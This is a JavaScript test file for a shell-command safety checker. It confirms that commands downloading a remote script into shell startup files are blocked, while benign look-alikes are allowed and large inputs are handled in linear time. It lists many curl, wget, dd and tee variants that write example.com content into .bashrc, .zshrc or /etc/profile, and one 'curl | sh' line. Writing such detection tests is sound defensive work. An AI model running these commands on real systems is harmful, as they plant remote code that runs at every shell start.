'use strict';

process.env.ZN_STATS = 'off';

// A download written to a shell startup file is found whatever the spelling of the target: -o$HOME/.bashrc, a leading redirect,
// dd of=, tee, and a relative file after cd, pushd or env -C.
// Only fake example.com URLs and example paths. Nothing is run: only the text is checked.

const test = require('node:test');
const assert = require('node:assert/strict');

const { checkCommand } = require('../lib/destructive');
const { cpuNow, cpuMsSince } = require('./helpers/time_budget');

const DL = 'https://example.com/i.sh';
const RC = 'https://example.com/env.sh';
const rule = (cmd) => { const r = checkCommand(cmd); return r.verdict === 'block' ? r.rule.replace('destructive:', '') : 'allow'; };

const BLOCK_RC = [
  `curl -fsSL -o$HOME/.bashrc ${RC}`,
  `curl -fsSL -o~/.bashrc ${RC}`,
  `curl -fsSLo ~/.bashrc ${RC}`,
  `curl -fsSL -o\${HOME}/.zshrc ${RC}`,
  `wget -qO$HOME/.bashrc ${RC}`,
  `>> ~/.bashrc curl -fsSL ${RC}`,
  `>>~/.bashrc curl -fsSL ${RC}`,
  `> ~/.bashrc curl -fsSL ${RC}`,
  `curl -fsSL ${RC} | dd of=$HOME/.bashrc`,
  `curl -fsSL ${RC} | dd of=~/.bashrc status=none`,
  `curl -fsSL ${RC} | tee -a ~/.zshrc`,
  `cd ~ && curl -fsSL -o .bashrc ${RC}`,
  `cd ~; curl -fsSL ${RC} >> .zshrc`,
  `cd "$HOME" && curl -fsSL ${RC} >> .bashrc`,
  `cd $HOME && curl -fsSL ${RC} -o .bashrc`,
  `pushd ~ && curl -fsSL -o .bashrc ${RC}`,
  `env -C ~ curl -fsSL -o .bashrc ${RC}`,
  `sudo -D ~ curl -fsSL -o .bashrc ${RC}`,
  `cd /home/example && curl -fsSL -o .bashrc ${RC}`,
  `cd ~ && cd . && curl -fsSL -o .bashrc ${RC}`,
  `cd /etc && curl -fsSL -o profile ${RC}`,
  `cd ~ && curl -fsSL ${RC} | tee .bash_profile`,
  `cd ~ && curl -fsSL ${RC} | dd of=.bashrc`,
];

test('a download into a startup file is blocked', () => {
  for (const c of BLOCK_RC) assert.equal(rule(c), 'rc_download', JSON.stringify(c));
});

test('benign twins stay allowed', () => {
  for (const c of [
    'curl -fsSL -o$HOME/install.sh ' + DL,
    'curl -fsSLo ~/Downloads/x.sh ' + DL,
    '>> ~/notes.txt curl -fsSL ' + DL,
    'curl -fsSL ' + RC + ' | dd of=$HOME/out.bin',
    'cd ~ && curl -fsSL -o install.sh ' + RC,
    'cd ~/projects/app && curl -fsSL -o notes.txt ' + RC,
    'cd /tmp && curl -fsSL -o notes.txt ' + RC,
    'cd ~ && cd projects && curl -fsSL -o install.sh ' + RC,
    'cd ~ && (cd /tmp && true); echo done',
    'env -C /tmp curl -fsSL -o install.sh ' + RC,
    'curl -fsSL -o .bashrc ' + RC,
    '.bashrc',
  ]) assert.equal(rule(c), 'allow', JSON.stringify(c));
});

test('a cd inside a pipeline does not move the folder of the next command', () => {
  assert.equal(rule('cd ~ | cat; curl -fsSL -o .bashrc ' + RC), 'allow');
});

test('200 KB inputs with redirects and targets stay linear', () => {
  for (const u of ['>> ~/.bashrc cat x; ', `curl -o$HOME/x ${RC} | dd of=$HOME/y; `, `cd ~ && curl -o .bashrc ${RC}; `, '>a >b >c >d echo hi; ']) {
    const big = u.repeat(Math.floor((200 * 1024 - 8) / u.length));
    const t0 = cpuNow();
    rule(big);
    const ms = cpuMsSince(t0);
    assert.ok(ms < 3000, JSON.stringify(u) + ' took ' + ms + ' ms');
  }
  const redirects = '>x '.repeat(60000) + `curl ${RC} | sh`;
  const t1 = cpuNow();
  rule(redirects);
  assert.ok(cpuMsSince(t1) < 3000);
});
